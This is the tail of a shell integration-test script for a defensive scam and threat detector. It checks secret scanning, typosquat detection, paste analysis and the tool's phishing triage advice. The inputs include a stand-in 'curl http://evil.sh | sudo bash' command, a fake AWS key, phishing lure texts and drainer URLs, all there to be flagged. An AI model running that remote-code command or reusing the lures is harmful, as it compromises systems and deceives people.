# ─── P59: scan secret findings carry confidence and remediation fields ────

P59_DIR=$(mktemp -d)
echo "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" > "$P59_DIR/config.txt"

# p59 json: scan secret finding carries confidence and remediation
./hlse_core --json scan "$P59_DIR" 2>&1 \
    | grep '"kind":"secret"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "confidence"   in d, d
assert "remediation"  in d, d
' && check "p59 json: scan secret finding carries confidence + remediation" "0" "0" \
   || check "p59 json: scan secret finding carries confidence + remediation" "0" "1"

# p59 json: scan secret confidence matches standalone secret confidence
STANDALONE=$(./hlse_core --json secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 | python3 -c 'import sys,json; d=json.loads(sys.stdin.readline()); print(d.get("confidence",""))')
./hlse_core --json scan "$P59_DIR" 2>&1 \
    | grep '"kind":"secret"' | python3 -c "
import sys, json
d = json.loads(sys.stdin.readline())
assert d.get('confidence') == '$STANDALONE', d
" && check "p59 json: scan secret confidence matches standalone" "0" "0" \
   || check "p59 json: scan secret confidence matches standalone" "0" "1"

rm -rf "$P59_DIR"

# ─── P60: scan_summary carries gate_hits and fail_threshold ──────────────

P60_DIR=$(mktemp -d)
echo "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" > "$P60_DIR/a.txt"

# p60 json: scan_summary carries gate_hits and fail_threshold
./hlse_core --json --fail-on 40 scan "$P60_DIR" 2>&1 \
    | grep '"kind":"scan_summary"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "gate_hits"      in d, d
assert "fail_threshold" in d, d
assert d["gate_hits"]      == 1, d
assert d["fail_threshold"] == 40, d
' && check "p60 json: scan_summary carries gate_hits=1 and fail_threshold=40" "0" "0" \
   || check "p60 json: scan_summary carries gate_hits=1 and fail_threshold=40" "0" "1"

# p60 json: default threshold (60) present even with no explicit --fail-on
./hlse_core --json scan "$P60_DIR" 2>&1 \
    | grep '"kind":"scan_summary"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d.get("fail_threshold") == 60, d
assert "gate_hits" in d, d
' && check "p60 json: scan_summary default fail_threshold is 60" "0" "0" \
   || check "p60 json: scan_summary default fail_threshold is 60" "0" "1"

rm -rf "$P60_DIR"

# ─── P61: audit JSON carries crit_count, high_count, next_steps ──────────

# p61 json: audit carries crit_count, high_count, and next_steps when findings > 0
./hlse_core --json audit 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "crit_count"  in d, d
assert "high_count"  in d, d
assert isinstance(d["crit_count"],  int), d
assert isinstance(d["high_count"],  int), d
# next_steps present only when score > 0
if d["score"] > 0:
    assert "next_steps" in d, d
' && check "p61 json: audit carries crit_count, high_count, next_steps" "0" "0" \
   || check "p61 json: audit carries crit_count, high_count, next_steps" "0" "1"

# p61: audit human output shows next step line when findings exist
./hlse_core audit 2>&1 \
    | grep -q "Next step:" \
    && check "p61: audit human shows next step guidance" "0" "0" \
    || check "p61: audit human shows next step guidance" "0" "1"

# p61 json: audit A7 HIGH finding increments high_count
./hlse_core --json audit 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
# A7 NOPASSWD is HIGH (severity 4) in test environment
assert d["high_count"] >= 1, d
' && check "p61 json: audit A7 HIGH increments high_count" "0" "0" \
   || check "p61 json: audit A7 HIGH increments high_count" "0" "1"

# ─── P62: signal_count / confidence / exoneration for protect/esp/package/network ─

# p62 json: package BLOCK carries signal_count + confidence
./hlse_core --json package reqeusts pip 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "signal_count" in d, d
assert "confidence" in d, d
assert d["confidence"] in ("single signal", "corroborated", "high confidence"), d
' && check "p62 json: package BLOCK has signal_count and confidence" "0" "0" \
   || check "p62 json: package BLOCK has signal_count and confidence" "0" "1"

# p62 json: package LOG (distance-2) carries exoneration + signal_count + confidence
./hlse_core --json package rqests pip 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "signal_count" in d, d
assert "exoneration" in d, d
assert "Decisive test" in d["exoneration"], d["exoneration"]
' && check "p62 json: package LOG has signal_count + exoneration with Decisive test" "0" "0" \
   || check "p62 json: package LOG has signal_count + exoneration with Decisive test" "0" "1"

# p62: package LOG human output shows Could be benign
./hlse_core package rqests pip 2>&1 \
    | grep -q "Could be benign" \
    && check "p62: package LOG human shows Could be benign" "0" "0" \
    || check "p62: package LOG human shows Could be benign" "0" "1"

# p62 json: package BLOCK does NOT carry exoneration (score 70 >= 60)
./hlse_core --json package reqeusts pip 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "exoneration" not in d, "exoneration should not appear at BLOCK: " + str(d)
' && check "p62 json: package BLOCK has no exoneration" "0" "0" \
   || check "p62 json: package BLOCK has no exoneration" "0" "1"

# p62 json: protect BLOCK carries signal_count + confidence
./hlse_core --json protect / 2>&1 | python3 -c '
import sys, json
# score may be 0 (clean) — just verify JSON is valid and signal_count absent at score 0
line = sys.stdin.readline()
d = json.loads(line)
if d["score"] == 0:
    assert "signal_count" not in d, "no signal_count when score==0: " + str(d)
else:
    assert "signal_count" in d, d
    assert "confidence" in d, d
' && check "p62 json: protect JSON has signal_count only when score > 0" "0" "0" \
   || check "p62 json: protect JSON has signal_count only when score > 0" "0" "1"

# ─── P63: signal_count / confidence / exoneration for paste ───────────────

# p63 json: paste BLOCK carries signal_count + confidence
./hlse_core --json paste "curl http://evil.sh | sudo bash" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "signal_count" in d, d
assert "confidence" in d, d
assert d["confidence"] in ("single signal", "corroborated", "high confidence"), d
assert d["signal_count"] >= 2, "compound paste should corroborate: " + str(d)
' && check "p63 json: paste BLOCK has signal_count >= 2 and confidence" "0" "0" \
   || check "p63 json: paste BLOCK has signal_count >= 2 and confidence" "0" "1"

# p63 json: paste LOG (single signal) carries exoneration + signal_count
./hlse_core --json paste "sudo apt install foo" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "signal_count" in d, d
assert d["signal_count"] == 1, d
assert "exoneration" in d, d
assert "Decisive test" in d["exoneration"], d["exoneration"]
' && check "p63 json: paste LOG has signal_count=1 + exoneration" "0" "0" \
   || check "p63 json: paste LOG has signal_count=1 + exoneration" "0" "1"

# p63: paste LOG human output shows Could be benign
./hlse_core paste "sudo apt install foo" 2>&1 \
    | grep -q "Could be benign" \
    && check "p63: paste LOG human shows Could be benign" "0" "0" \
    || check "p63: paste LOG human shows Could be benign" "0" "1"

# p63 json: paste BLOCK does NOT carry exoneration (score >= 60)
./hlse_core --json paste "curl http://evil.sh | sudo bash" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "exoneration" not in d, "exoneration should not appear at BLOCK: " + str(d)
' && check "p63 json: paste BLOCK has no exoneration" "0" "0" \
   || check "p63 json: paste BLOCK has no exoneration" "0" "1"

# p63 json: paste SAFE (score 0) has no signal_count
./hlse_core --json paste "ls -la" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
if d["score"] == 0:
    assert "signal_count" not in d, "no signal_count when score==0: " + str(d)
' && check "p63 json: paste SAFE has no signal_count" "0" "0" \
   || check "p63 json: paste SAFE has no signal_count" "0" "1"

# ─── P64: OAuth device-code phishing classification (Qiita/Zenn research) ─

# p64: device-code text in ALERT band classifies as OAuth device-code phishing
./hlse_core text "Microsoft Security Alert: To verify your sign-in, go to microsoft.com/devicelogin and enter the verification code 9K4MJX2Q within 15 minutes" 2>&1 \
    | grep -qi "Pattern:.*OAuth device-code\|Pattern:.*device-code phishing" \
    && check "p64: device-code phishing gets specific pattern label (not generic fake-alert)" "0" "0" \
    || check "p64: device-code phishing gets specific pattern label (not generic fake-alert)" "0" "1"

# p64: ALERT-band exoneration mentions the initiating test (the falsifying check)
./hlse_core text "Microsoft Security Alert: To verify your sign-in, go to microsoft.com/devicelogin and enter the verification code 9K4MJX2Q within 15 minutes" 2>&1 \
    | grep -qi "initiate a sign-in\|did YOU initiate" \
    && check "p64: device-code ALERT exoneration shows initiation falsifying test" "0" "0" \
    || check "p64: device-code ALERT exoneration shows initiation falsifying test" "0" "1"

# p64: BLOCK-band names OAuth tokens as the objective (not generic credentials)
./hlse_core text "URGENT Microsoft Office 365 Security Alert: Your account verification code is 9K4MJX2Q. Confirm immediately at microsoft.com/devicelogin or your account will be locked in 1 hour - IT Admin" 2>&1 \
    | grep -qi "OAuth tokens\|persistent access.*bypasses MFA" \
    && check "p64: device-code BLOCK objective names OAuth tokens + MFA bypass" "0" "0" \
    || check "p64: device-code BLOCK objective names OAuth tokens + MFA bypass" "0" "1"

# p64: BLOCK-band triage points to entra.microsoft.com token revocation (Qiita research)
./hlse_core text "URGENT Microsoft Office 365 Security Alert: Your account verification code is 9K4MJX2Q. Confirm immediately at microsoft.com/devicelogin or your account will be locked in 1 hour - IT Admin" 2>&1 \
    | grep -qi "entra.microsoft.com\|revoke.*tokens" \
    && check "p64: device-code BLOCK triage cites entra.microsoft.com token revocation" "0" "0" \
    || check "p64: device-code BLOCK triage cites entra.microsoft.com token revocation" "0" "1"

# p64: BLOCK-band cascade names connected SaaS apps (SharePoint/Teams/Exchange)
./hlse_core text "URGENT Microsoft Office 365 Security Alert: Your account verification code is 9K4MJX2Q. Confirm immediately at microsoft.com/devicelogin or your account will be locked in 1 hour - IT Admin" 2>&1 \
    | grep -qi "SharePoint\|Teams.*Exchange\|connected SaaS" \
    && check "p64: device-code BLOCK cascade names connected SaaS tenant apps" "0" "0" \
    || check "p64: device-code BLOCK cascade names connected SaaS tenant apps" "0" "1"

# p64 json: pattern field contains 'device-code' label
./hlse_core --json text "Microsoft Security Alert: To verify your sign-in, go to microsoft.com/devicelogin and enter the verification code 9K4MJX2Q within 15 minutes" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "device-code" in d["pattern"].lower() or "oauth" in d["pattern"].lower(), d
' && check "p64 json: pattern field carries device-code/OAuth label" "0" "0" \
   || check "p64 json: pattern field carries device-code/OAuth label" "0" "1"

# ─── P65: npm self-propagating worm cascade (Shai-Hulud research) ─────────

# p65: package BLOCK triage warns about disk-wide secret scan (not just shell env)
./hlse_core package reqeusts pip 2>&1 \
    | grep -qi "disk-wide secret scan\|rotate EVERY credential" \
    && check "p65: package BLOCK triage warns disk-wide credential scan" "0" "0" \
    || check "p65: package BLOCK triage warns disk-wide credential scan" "0" "1"

# p65: package BLOCK triage tells maintainers to revoke publish token first
./hlse_core package reqeusts pip 2>&1 \
    | grep -qi "revoke your npm/PyPI token\|publish.*token.*FIRST" \
    && check "p65: package BLOCK triage tells maintainers revoke publish token" "0" "0" \
    || check "p65: package BLOCK triage tells maintainers revoke publish token" "0" "1"

# p65: package BLOCK cascade names self-propagation vector
./hlse_core package reqeusts pip 2>&1 \
    | grep -qi "self-propagation vector\|republishes.*YOUR packages" \
    && check "p65: package BLOCK cascade names self-propagation vector" "0" "0" \
    || check "p65: package BLOCK cascade names self-propagation vector" "0" "1"

# p65 json: package triage cites lifecycle scripts (preinstall/postinstall)
./hlse_core --json package reqeusts pip 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "preinstall" in d["triage"] or "lifecycle" in d["triage"], d["triage"]
assert "publish" in d["cascade_risk"].lower(), d["cascade_risk"]
' && check "p65 json: package triage/cascade cite lifecycle + publish-token vector" "0" "0" \
   || check "p65 json: package triage/cascade cite lifecycle + publish-token vector" "0" "1"

# ─── P66: AiTM reverse-proxy phishing triage — session revocation over 2FA ─

# p66: generic credential-harvest BLOCK triage leads with session revocation
./hlse_core "https://secure-login-verify.xyz/account/signin" 2>&1 \
    | grep -qi "revoke all active sessions\|sign out everywhere" \
    && check "p66: credential-harvest triage leads with session revocation" "0" "0" \
    || check "p66: credential-harvest triage leads with session revocation" "0" "1"

# p66: triage explains 2FA does not stop AiTM session-cookie theft
./hlse_core "https://secure-login-verify.xyz/account/signin" 2>&1 \
    | grep -qi "2FA does not stop\|steals the session cookie" \
    && check "p66: triage explains 2FA does not stop session-cookie theft" "0" "0" \
    || check "p66: triage explains 2FA does not stop session-cookie theft" "0" "1"

# p66 json: triage field carries the session-revocation guidance
./hlse_core --json "https://secure-login-verify.xyz/account/signin" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
t = d.get("triage", "")
assert "revoke all active sessions" in t or "sign out everywhere" in t, t
assert "session cookie" in t, t
' && check "p66 json: triage carries AiTM session-revocation guidance" "0" "0" \
   || check "p66 json: triage carries AiTM session-revocation guidance" "0" "1"

# ─── P67: AI voice-clone defense for emergency/grandparent scams (2026) ───

EMERG_BLOCK="Grandma it is me. I was in a car accident and I am in jail. I need bail money immediately. Please don't call mom. Send it right away"

# p67: emergency BLOCK verify warns voice is not proof (AI clone)
./hlse_core text "$EMERG_BLOCK" 2>&1 \
    | grep -qi "do not trust the voice\|voice-cloning\|AI clones a voice" \
    && check "p67: emergency verify warns AI voice-cloning" "0" "0" \
    || check "p67: emergency verify warns AI voice-cloning" "0" "1"

# p67: emergency BLOCK triage recommends a pre-agreed safe word
./hlse_core text "$EMERG_BLOCK" 2>&1 \
    | grep -qi "safe word" \
    && check "p67: emergency triage recommends pre-agreed safe word" "0" "0" \
    || check "p67: emergency triage recommends pre-agreed safe word" "0" "1"

# p67: emergency LOG-band exoneration carries the voice-clone falsifying test
./hlse_core text "had an accident, please help" 2>&1 \
    | grep -qi "familiar voice is no longer proof\|safe word" \
    && check "p67: emergency LOG exoneration cites voice-clone test" "0" "0" \
    || check "p67: emergency LOG exoneration cites voice-clone test" "0" "1"

# p67 json: emergency BLOCK verify+triage carry safe-word guidance
./hlse_core --json text "$EMERG_BLOCK" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
v, t = d.get("verify",""), d.get("triage","")
assert "safe word" in v or "voice-cloning" in v, v
assert "safe word" in t or "AI clones a voice" in t, t
' && check "p67 json: emergency verify+triage carry voice-clone/safe-word guidance" "0" "0" \
   || check "p67 json: emergency verify+triage carry voice-clone/safe-word guidance" "0" "1"

# ─── P68: physical QR-sticker overlay + payment-QR quishing defense (2026) ─

QR_BLOCK="Scan this QR code to verify your account urgently or it will be suspended, confirm your password and card details now"

# p68: QR BLOCK verify warns about physical sticker overlay
./hlse_core --from qr text "$QR_BLOCK" 2>&1 \
    | grep -qi "sticker placed over\|PHYSICAL QR" \
    && check "p68: QR verify warns physical sticker overlay" "0" "0" \
    || check "p68: QR verify warns physical sticker overlay" "0" "1"

# p68: QR BLOCK verify tells user to confirm payee name on payment QR
./hlse_core --from qr text "$QR_BLOCK" 2>&1 \
    | grep -qi "payee name\|matches the real merchant" \
    && check "p68: QR verify confirms payee name on payment QR" "0" "0" \
    || check "p68: QR verify confirms payee name on payment QR" "0" "1"

# p68: QR BLOCK triage covers approved-payment dispute path
./hlse_core --from qr text "$QR_BLOCK" 2>&1 \
    | grep -qi "approved a payment\|stop or dispute" \
    && check "p68: QR triage covers payment-dispute path" "0" "0" \
    || check "p68: QR triage covers payment-dispute path" "0" "1"

# p68: QR ALERT-band exoneration cites the physical sticker check
./hlse_core text "Scan this QR code to verify your account and avoid suspension" 2>&1 \
    | grep -qi "sticker placed over the original\|not a sticker" \
    && check "p68: QR exoneration cites physical sticker check" "0" "0" \
    || check "p68: QR exoneration cites physical sticker check" "0" "1"

# p68 json: QR BLOCK verify carries physical + payment guidance
./hlse_core --json --from qr text "$QR_BLOCK" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
v = d.get("verify","")
assert "sticker" in v and "payee" in v, v
' && check "p68 json: QR verify carries physical+payment guidance" "0" "0" \
   || check "p68 json: QR verify carries physical+payment guidance" "0" "1"

# ─── P69: crypto wallet-drainer approval-revocation guidance (Web3 2026) ──

DRAIN_URL="https://metamask-connect-wallet.com/restore-wallet"

# p69: crypto triage covers the approval-drainer revoke path (not just seed theft)
./hlse_core "$DRAIN_URL" 2>&1 \
    | grep -qi "revoke the token approval\|revoke.cash" \
    && check "p69: crypto triage covers approval-revocation (revoke.cash)" "0" "0" \
    || check "p69: crypto triage covers approval-revocation (revoke.cash)" "0" "1"

# p69: triage explains a drainer steals via live approval, not the seed
./hlse_core "$DRAIN_URL" 2>&1 \
    | grep -qi "live approval, not your seed\|drainer steals through a live approval" \
    && check "p69: crypto triage explains drainer uses live approval not seed" "0" "0" \
    || check "p69: crypto triage explains drainer uses live approval not seed" "0" "1"

# p69: cascade tells victim to audit/revoke EVERY active token approval
./hlse_core "$DRAIN_URL" 2>&1 \
    | grep -qi "revoke EVERY active token approval\|approvals across several tokens" \
    && check "p69: crypto cascade audits all active token approvals" "0" "0" \
    || check "p69: crypto cascade audits all active token approvals" "0" "1"

# p69 json: triage + cascade both carry revoke.cash guidance
./hlse_core --json "$DRAIN_URL" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert "revoke.cash" in d.get("triage",""), d.get("triage","")
assert "revoke.cash" in d.get("cascade_risk",""), d.get("cascade_risk","")
' && check "p69 json: triage+cascade carry approval-revocation guidance" "0" "0" \
   || check "p69 json: triage+cascade carry approval-revocation guidance" "0" "1"

# ─── results ────────────────────────────────────────────────────────────

echo ""
echo "═════════════════════════════════"
echo "  CLI Integration: $PASS passed, $FAIL failed"
echo "═════════════════════════════════"

[ "$FAIL" -eq 0 ]
